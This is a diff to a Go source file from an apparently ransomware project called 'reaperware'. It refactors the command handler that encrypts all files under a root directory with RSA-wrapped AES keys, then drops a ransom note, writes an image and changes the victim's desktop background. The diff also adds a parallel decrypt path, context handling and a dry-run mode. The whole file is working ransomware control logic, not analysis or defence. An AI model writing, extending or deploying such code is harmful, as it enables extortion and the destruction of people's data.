@@ -1,10 +1,11 @@
 package userinput
 
 import (
-	"fmt"
+	"context"
 	"log"
-	"os"
+
 	"reaperware/pkg/aeskeys"
+	"reaperware/pkg/config"
 	"reaperware/pkg/filedirectory"
 	"reaperware/pkg/notes"
 	"reaperware/pkg/rsakeys"
@@ -16,65 +17,62 @@ const (
 	ExceptionStatement string = "Expected givemesomeskittlesbutidontwanttopayfordem or putthatbaaaaaaaack"
 )
 
-func usage() string {
-	return fmt.Sprintf(
-		"Usage:\n  %s <command>\n\nCommands:\n  %s\n  %s\n",
-		os.Args[0],
-		Encrypt,
-		Decrypt,
-	)
-}
-
-// Check for user input matches our const, otherwise throw "exception" and exit
+// CommandCheck validates the encrypt/decrypt token.
 func CommandCheck(command string) {
 	if command == Encrypt || command == Decrypt {
 		return
-	} else {
-		log.Fatalln(ExceptionStatement)
 	}
+	log.Fatalln(ExceptionStatement)
 }
 
-// Parse user commands to execute program
-func UserCommands() {
-	if len(os.Args) != 2 {
-		log.Fatalf("Invalid arguments.\n%s", usage())
+// Run executes the selected command with config from main (context, workers, dry-run, etc.).
+func Run(ctx context.Context, cfg *config.Run) error {
+	CommandCheck(cfg.Command)
+
+	root := cfg.Root
+	if root == "" {
+		root = filedirectory.RootDir()
 	}
 
-	var command string = os.Args[1]
+	report := filedirectory.NewResultReport(cfg.DryRun)
 
-	CommandCheck(command)
-
-	// fs := flag.NewFlagSet(command, flag.ExitOnError)
-	switch command {
+	switch cfg.Command {
 	case Encrypt:
 		log.Println("[+] Encrypting process")
-		rootDirectory := filedirectory.RootDir()
 		_, rsaPublicKey := rsakeys.CreateRSAKeys()
-
 		aesKey := aeskeys.CreateAESKey(rsaPublicKey)
 
-		filedirectory.EncryptTheFiles(rootDirectory, aesKey)
+		if err := filedirectory.EncryptTheFiles(ctx, root, aesKey, cfg, report); err != nil {
+			log.Printf("[-] Encrypt run ended with: %v\n", err)
+			log.Println("[*]", report.Summary())
+			return err
+		}
+		log.Println("[*]", report.Summary())
+
+		if cfg.DryRun {
+			log.Println("[dry-run] Skipping note, PNG, and background side effects.")
+			return nil
+		}
+
 		notes.WriteANote()
 		notes.WriteToPng()
 		notes.ChangeBackgroundImage()
-		return
+		return nil
+
 	case Decrypt:
 		log.Println("[+] Decrypting process")
-		rootDirectory := filedirectory.RootDir()
 		aesKey := rsakeys.UnencryptedAESKey()
 
-		encryptedFiles := filedirectory.FindTheEncryptedFiles(rootDirectory)
+		encryptedFiles := filedirectory.FindTheEncryptedFiles(ctx, root, cfg.MaxFileSize)
+		log.Printf("[+] Found %d encrypted files (after filters)\n", len(encryptedFiles))
 
-		// Log the number of encrypted files found
-		log.Printf("[+] Found %d encrypted files\n", len(encryptedFiles))
+		filedirectory.DecryptFilesInParallel(ctx, aesKey, encryptedFiles, cfg, report)
+		log.Println("[*]", report.Summary())
+		log.Println("[+] Decryption pass finished. Review logs for per-file errors.")
+		return ctx.Err()
 
-		// Decrypt all files in parallel
-		numWorkers := 10 // Adjust number of workers as needed
-		filedirectory.DecryptFilesInParallel(aesKey, encryptedFiles, numWorkers)
-
-		log.Println("[+] All files decrypted! Check logs to verify no failures")
-		return
 	default:
 		log.Fatalln("[-] Subcommand does not exist")
 	}
+	return nil
 }
